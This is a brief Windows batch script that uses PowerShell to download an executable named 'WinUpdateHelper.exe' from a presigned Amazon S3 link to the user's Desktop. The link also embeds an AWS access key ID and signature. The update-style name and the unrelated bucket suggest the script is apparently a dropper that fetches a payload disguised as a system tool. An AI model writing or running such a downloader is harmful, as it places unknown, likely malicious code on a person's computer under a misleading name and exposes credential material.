@echo off
set "URL=https://logs69.s3.eu-west-3.amazonaws.com/WinUpdateHelper.exe?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAR34JNEAP5K66HU4P%%2F20260204%%2Feu-west-3%%2Fs3%%2Faws4_request&X-Amz-Date=20260204T171643Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=071944b13943f0ed35bf582680641c3a89a874bad04fe0724cf73ea3db936978"

powershell -c "(New-Object Net.WebClient).DownloadFile('%URL%','%USERPROFILE%\Desktop\WinUpdateHelper.exe')"